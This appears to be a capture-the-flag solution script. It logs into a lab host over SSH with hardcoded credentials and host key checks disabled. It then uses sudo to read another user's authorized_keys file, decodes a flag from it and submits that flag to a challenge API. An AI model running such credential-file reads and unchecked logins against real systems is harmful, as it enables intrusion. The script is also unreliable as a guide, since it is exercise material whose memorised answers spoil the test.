#!/bin/bash
set -euo pipefail

CHALLENGE_ID='scl-challenge-frame-1da7fb'
HOST='172.20.0.141'
USER='analyst'
PASSWORD='neon-archive-74'

nmap -n -p 22 --open "$HOST" >/dev/null
key_record=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$USER@$HOST" 'sudo cat /home/retro/.ssh/authorized_keys')
encoded=$(printf '%s\n' "$key_record" | python3 -c 'import sys; line=sys.stdin.readline().strip().split(); print(line[-1])')
flag=$(printf '%s' "$encoded" | python3 -c 'import base64,sys; print(base64.b64decode(sys.stdin.read()).decode())')
curl -s "http://172.20.0.3/api/challenges/submit" -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"$CHALLENGE_ID\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
printf '\n'
